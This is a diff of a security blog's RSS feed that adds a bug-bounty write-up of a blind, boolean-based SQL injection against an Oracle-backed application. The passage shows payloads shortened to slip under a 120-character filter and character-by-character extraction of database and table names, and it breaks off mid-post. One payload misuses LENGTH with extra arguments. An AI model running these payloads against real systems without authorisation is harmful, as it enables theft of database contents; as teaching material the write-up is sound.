@@ -5,8 +5,236 @@
     <link>https://kuldeep.io/tags/sqli/</link>
     <description>Recent content in SQLi on kuldeepdotexe&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Sat, 15 Jan 2022 20:50:13 +0530</lastBuildDate><atom:link href="https://kuldeep.io/tags/sqli/index.xml" rel="self" type="application/rss+xml" />
+    <language>en</language>
+    <lastBuildDate>Wed, 06 Dec 2023 20:39:44 +0530</lastBuildDate><atom:link href="https://kuldeep.io/tags/sqli/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Defeating Length Filters to Dump the Database - SQLi</title>
+      <link>https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/</link>
+      <pubDate>Wed, 06 Dec 2023 20:39:44 +0530</pubDate>
+      
+      <guid>https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/</guid>
+      <description>Hello, hackers!
+As usual, this blog post will focus on my recent findings. This time, it was an SQL injection. Most SQL injections I find are very trivial and do not require a separate blog post.
+However, this particular SQL injection was far from being straightforward. It required me to work 13+ hours to successfully dump the database. Although some of the tricks that I used for this SQL injection are not new and can be found with a bit of Google search, I learned them the hard way.</description>
+      <content>&lt;p&gt;Hello, hackers!&lt;/p&gt;
+&lt;p&gt;As usual, this blog post will focus on my recent findings. This time, it was an SQL injection. Most SQL injections I find are very trivial and do not require a separate blog post.&lt;/p&gt;
+&lt;p&gt;However, this particular SQL injection was far from being straightforward. It required me to work 13+ hours to successfully dump the database. Although some of the tricks that I used for this SQL injection are not new and can be found with a bit of Google search, I learned them the hard way.&lt;/p&gt;
+&lt;p&gt;This blog post aims to share with the community the tricks that I learned. I hope that these tricks will be helpful to someone who encounters similar challenges.&lt;/p&gt;
+&lt;p&gt;In this blog post, I will cover my entire thought process and journey from detection to full exploitation of the SQL injection.&lt;/p&gt;
+&lt;p&gt;For your convenience, I will break apart this blog into several sections. These sections will be as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Discovery&lt;/li&gt;
+&lt;li&gt;Running SQLMap And Discovering The Balanced Query&lt;/li&gt;
+&lt;li&gt;SQLMap Failing To Dump The Database&lt;/li&gt;
+&lt;li&gt;Discovering Length Filter&lt;/li&gt;
+&lt;li&gt;Dumping The Database Name&lt;/li&gt;
+&lt;li&gt;Dumping The Table Name&lt;/li&gt;
+&lt;li&gt;Finding A Way To Use Limits And Offsets&lt;/li&gt;
+&lt;li&gt;Finding The Shortest Possible Payload&lt;/li&gt;
+&lt;li&gt;Successfully Dumping Table Names&lt;/li&gt;
+&lt;li&gt;Guessing Column Names&lt;/li&gt;
+&lt;li&gt;Dumping The Rows&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;These look like a lot of sections. This is because they are! I am trying to crunch up 13+ hours of work into a single blog. Brace yourself for a long read.&lt;/p&gt;
+&lt;h3 id=&#34;discovery&#34;&gt;Discovery&lt;/h3&gt;
+&lt;p&gt;A new target was onboarded to me on the Synack Red Team platform. However, it was an old target launched under a new name. No surprise there.&lt;/p&gt;
+&lt;p&gt;While this target was previously onboarded, I sent a few SQLis. Because of this, I was certain that I could find more SQLis this time.&lt;/p&gt;
+&lt;p&gt;As usual, I browsed the application like a normal user and checked the requests that the application sent. I tested each request manually for SQL injections.&lt;/p&gt;
+&lt;p&gt;The &amp;ldquo;manual testing&amp;rdquo; part for me is mostly injecting special characters into different parameters and observing the behavior of the application.&lt;/p&gt;
+&lt;p&gt;While testing for SQL injection on a particular request, I noticed the following behavior:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Payload&lt;/th&gt;
+&lt;th&gt;Response Length&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;422k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&#39;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;33k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&#39;-- -&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;33k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&#39;)-- -&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;422k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Note: The first value is nothing. I sent nothing. It is the normal response the application would send.&lt;/p&gt;
+&lt;p&gt;This was intriguing behavior. It looked like a potential SQL injection. I tried a few more SQLi payloads but I could not find the right payload for it.&lt;/p&gt;
+&lt;h3 id=&#34;running-sqlmap-and-discovering-the-balanced-query&#34;&gt;Running SQLMap And Discovering The Balanced Query&lt;/h3&gt;
+&lt;p&gt;To find the correct query, I sent the request to &lt;a href=&#34;https://github.com/sqlmapproject/sqlmap&#34;&gt;SQLMap&lt;/a&gt;. SQLMap successfully discovered the SQL injection and gave me the query that would give me a boolean response.&lt;/p&gt;
+&lt;p&gt;It gave me the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT (CASE WHEN (4747=4747) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4747) END) FROM DUAL) IS NULL OR &amp;#39;&lt;/span&gt;iTjZ&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;tEus
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;payload-explanation&#34;&gt;Payload Explanation&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;SELECT (...) FROM DUAL&lt;/code&gt;: This is just a simple &lt;code&gt;SELECT&lt;/code&gt; query that encapsulates the underlying &lt;code&gt;CASE...WHEN&lt;/code&gt; statement.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CASE WHEN (condition) THEN &amp;lt;true statement&amp;gt; ELSE &amp;lt;false statement&amp;gt; END&lt;/code&gt;: This section is the most important as &lt;code&gt;CASE...WHEN&lt;/code&gt; will execute a &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; statement based on the condition. It is similar to the classic &lt;code&gt;if…else&lt;/code&gt; in different programming languages.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;4747=4747&lt;/code&gt;: This is an always true condition as 4747 is always equal to 4747.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CTXSYS.DRITHSX.SN(1,4747)&lt;/code&gt;: This is a function call to an internal Oracle DBMS function. I could not find much documentation about the function. But in this payload, this function should respond with an error message.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;So, the payload checks if 4747 is equal to 4747 (which is true) then it selects &lt;code&gt;NULL&lt;/code&gt; and compares &lt;code&gt;NULL&lt;/code&gt; with &lt;code&gt;NULL&lt;/code&gt; (which is also true). This will result in a true response.&lt;/p&gt;
+&lt;p&gt;If we wanted to receive a false response, we would replace &lt;code&gt;4747=4747&lt;/code&gt; with &lt;code&gt;4747=4848&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;I now had a working payload. I tried to enumerate the databases using SQLMap. However, SQLMap failed to enumerate the databases.&lt;/p&gt;
+&lt;p&gt;I was not surprised by this behavior because, during my initial enumeration, I noticed that the server correctly filtered out some characters. These characters included but were not limited to the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;`&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Due to these character filters, SQLMap was unable to enumerate the databases. I decided to do the database dumping by hand.&lt;/p&gt;
+&lt;p&gt;I simplified the SQLMap&amp;rsquo;s payload to the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    SELECT (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	CASE 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	WHEN (1=1) THEN NULL 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	ELSE 1/0 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ) FROM DUAL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) IS NULL OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;discovering-length-filter&#34;&gt;Discovering Length Filter&lt;/h3&gt;
+&lt;p&gt;After doing a little back and forth with the payloads, I realised that some payloads were not acting as they should be.&lt;/p&gt;
+&lt;p&gt;For example, the following payload resulted in a &lt;code&gt;302 Found&lt;/code&gt; response rather than a &lt;code&gt;200 OK&lt;/code&gt; response:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    SELECT (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	CASE 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	WHEN (12345678901234567890=12345678901234567890) THEN NULL 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	ELSE 1/0 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ) FROM DUAL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) IS NULL OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Although they are both the same numbers, the server was resulting in a &lt;code&gt;302 Found&lt;/code&gt; response. Usually, the server responded in a &lt;code&gt;302 Found&lt;/code&gt; response when we sent a character that the server was filtering.&lt;/p&gt;
+&lt;p&gt;However, we did not send any bad characters in this payload. The &lt;code&gt;1=1&lt;/code&gt; payload was found to be working previously.&lt;/p&gt;
+&lt;p&gt;I changed the condition from &lt;code&gt;12345678901234567890=12345678901234567890&lt;/code&gt; to &lt;code&gt;1234567890=1234567890&lt;/code&gt; and the server returned &lt;code&gt;200 OK&lt;/code&gt; with a &lt;code&gt;true&lt;/code&gt; response.&lt;/p&gt;
+&lt;p&gt;This was evident that something weird happened when we sent a large payload. There must be some sort of length filter on the backend that prevents us from sending long payloads.&lt;/p&gt;
+&lt;p&gt;After adding one character at a time, I figured out that if we send any more characters than &lt;strong&gt;120&lt;/strong&gt;, the server would not process the request and we would receive a &lt;code&gt;302 Found&lt;/code&gt; response. Whatever payload we use must be less than or equal to 120 characters.&lt;/p&gt;
+&lt;p&gt;I tried to see ways in which I could shorten the payload. I learned that we can replace &lt;code&gt;NULL&lt;/code&gt; with &lt;code&gt;1&lt;/code&gt; in the payload and it will work just fine. The resulting &lt;em&gt;shorter&lt;/em&gt; payload was:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	SELECT (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;			WHEN (1=1) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;			ELSE 1/0 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	) FROM DUAL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We moved from requiring 86 characters to 74 characters! Excellent!&lt;/p&gt;
+&lt;p&gt;I suspected that the &lt;code&gt;SELECT&lt;/code&gt; statement around the &lt;code&gt;CASE...WHEN&lt;/code&gt; statement was necessary. I tried removing it and it turns out that it was optional! We can directly use &lt;code&gt;CASE...WHEN&lt;/code&gt; without wrapping it using &lt;code&gt;SELECT&lt;/code&gt;. Our payload was even shorter now.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN (1=2) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This payload was merely 55 characters long!&lt;/p&gt;
+&lt;h3 id=&#34;dumping-the-database-name&#34;&gt;Dumping The Database Name&lt;/h3&gt;
+&lt;p&gt;It was now time to enumerate the database names. My strategy to dump the database name was as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Find out the length of the current database name. We will refer to the length of the database as &lt;code&gt;len&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use a substring payload where the &lt;code&gt;SUBSTR()&lt;/code&gt; function starts from the first character of the database and goes till &lt;code&gt;len&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Enumerate one character at a time.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;To determine the database length, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT LENGTH(SYS.DATABASE_NAME) FROM DUAL)&amp;gt;0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above payload checks if the length of the current database name is greater than 0. This is true for any database name. Hence, we get a &lt;code&gt;true&lt;/code&gt; response.&lt;/p&gt;
+&lt;p&gt;By increasing one number at a time, we get to know that the database name is exactly &lt;strong&gt;6&lt;/strong&gt; characters long.&lt;/p&gt;
+&lt;p&gt;To dump the database name, I used a &lt;code&gt;SUBSTR()&lt;/code&gt; payload that looks like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT ASCII(SUBSTR(SYS.DATABASE_NAME,1,1)) FROM DUAL)&amp;gt;0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;payload-explanation-1&#34;&gt;Payload Explanation&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;SUBSTR(SYS.DATABASE_NAME,1,1)&lt;/code&gt;: This part returns the very first character of the database name.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ASCII(...)&lt;/code&gt;: This function converts the first character of the database name to its corresponding ASCII value.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ASCII(SUBSTR(...))&amp;gt;0&lt;/code&gt;: This part checks if the ASCII value of the first character is greater than 0 (which is always true unless the server uses Unicode database names).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In theory, we can keep increasing from &lt;code&gt;0&lt;/code&gt; to up to &lt;code&gt;127&lt;/code&gt;. However, valid database names start after &lt;code&gt;45&lt;/code&gt; (ASCII value of &lt;code&gt;-&lt;/code&gt;) and go up to &lt;code&gt;122&lt;/code&gt; (ASCII value of lowercase &lt;code&gt;z&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;I did the brute force for each character and found out the database name to be &amp;ldquo;&lt;strong&gt;SYNACK&lt;/strong&gt;&amp;rdquo; (obviously fake because I will not reveal client details).&lt;/p&gt;
+&lt;h3 id=&#34;dumping-the-table-name&#34;&gt;Dumping The Table Name&lt;/h3&gt;
+&lt;p&gt;Now that we know the database name, it was our turn to dump the table names. Using &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md&#34;&gt;PayloadsAllTheThings&lt;/a&gt;, I came across the following query:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; all_tables
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this query would return multiple rows in the response. Using our technique, we can only dump one row and one column, one character at a time. It is very slow but this is the best that we have got.&lt;/p&gt;
+&lt;p&gt;Following the PayloadsAllTheThings page, I knew that we could use the &lt;code&gt;ROWNUM&lt;/code&gt; pseudo-column to filter from the number of rows returned by the query. Incorporating this into our payload, this was our payload that finds the length of the first table from the &lt;code&gt;all_tables&lt;/code&gt; view:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables WHERE ROWNUM=1)=0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Increasing the number, I found out that the table was &lt;strong&gt;4&lt;/strong&gt; characters long.&lt;/p&gt;
+&lt;p&gt;After using a &lt;code&gt;SUBSTR()&lt;/code&gt; payload, I discovered the table name was &amp;ldquo;&lt;strong&gt;DUAL&lt;/strong&gt;&amp;rdquo;. :/ For a practical proof-of-concept, we will need a table that is not a system table. It should contain some client data.&lt;/p&gt;
+&lt;p&gt;I changed from &lt;code&gt;ROWNUM=1&lt;/code&gt; to &lt;code&gt;ROWNUM=2&lt;/code&gt; in the hope that it would give me the next row. However, in Oracle, the &lt;code&gt;ROWNUM&lt;/code&gt; pseudo-column works in an unexpected way. We cannot directly provide a row number apart from &lt;code&gt;ROWNUM=1&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;finding-a-way-to-use-limits-and-offsets&#34;&gt;Finding A Way To Use Limits And Offsets&lt;/h3&gt;
